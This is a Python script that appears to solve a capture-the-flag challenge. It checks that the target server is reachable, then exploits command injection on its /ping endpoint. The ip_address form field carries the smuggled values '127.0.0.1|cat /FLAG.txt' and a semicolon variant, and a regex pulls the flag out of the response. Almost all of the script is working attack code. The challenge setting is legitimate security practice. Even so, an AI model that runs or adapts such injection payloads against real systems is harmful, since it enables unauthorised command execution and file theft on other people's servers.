import requests
import re
import time

# First test basic connectivity
base_url = "http://challenges.ringzer0team.com:10190"
ping_endpoint = f"{base_url}/ping"

print("[+] Testing connectivity to target...")
print(f"[+] Base URL: {base_url}\n")

# Test 1: Basic GET to verify server is reachable
try:
    print("[Test 1] Attempting GET request to base URL...")
    response = requests.get(base_url, timeout=10)
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Server reachable! Content length: {len(response.text)} bytes\n")
    
except requests.exceptions.Timeout:
    print("[-] Timeout - server not responding")
except requests.exceptions.ConnectionError as e:
    print(f"[-] Connection error: {e}")
except Exception as e:
    print(f"[-] Error: {e}")

# Test 2: Try to access /ping endpoint
try:
    print("\n[Test 2] Attempting GET to /ping endpoint...")
    response = requests.get(ping_endpoint, timeout=10)
    print(f"[+] Status: {response.status_code}")
    if response.status_code == 200:
        print(f"[+] /ping endpoint accessible\n")
    else:
        print(f"[+] /ping returned status {response.status_code}\n")
        
except Exception as e:
    print(f"[-] Error accessing /ping: {e}\n")

# Test 3: Execute the actual exploit
try:
    print("[Test 3] Executing command injection exploit...")
    print("[+] Target: POST /ping")
    print("[+] Parameter: ip_address")
    print("[+] Payload: 127.0.0.1|cat /FLAG.txt")
    print("[+] Content-Type: application/x-www-form-urlencoded\n")
    
    post_data = {'ip_address': '127.0.0.1|cat /FLAG.txt'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    response = requests.post(ping_endpoint, data=post_data, headers=headers, timeout=15)
    
    print(f"[+] Response Status: {response.status_code}")
    print(f"[+] Response Length: {len(response.text)} bytes")
    print(f"[+] Response Body:")
    print("-" * 60)
    print(response.text)
    print("-" * 60)
    
    # Extract flag
    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
    if flag_match:
        print(f"\n[!] SUCCESS! FLag extracted: {flag_match.group(0)}")
    else:
        # Try alternative separators if pipe doesn't work
        print("\n[!] No flag found with pipe operator, trying semicolon...")
        post_data = {'ip_address': '127.0.0.1;cat /FLAG.txt'}
        response = requests.post(ping_endpoint, data=post_data, headers=headers, timeout=15)
        flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
        if flag_match:
            print(f"[!] SUCCESS with semicolon! Flag: {flag_match.group(0)}")
        else:
            print(f"[!] Still no flag. Response: {response.text[:500]}")
            
except Exception as e:
    print(f"[-] Exploit error: {e}")
    import traceback
    print(traceback.format_exc())
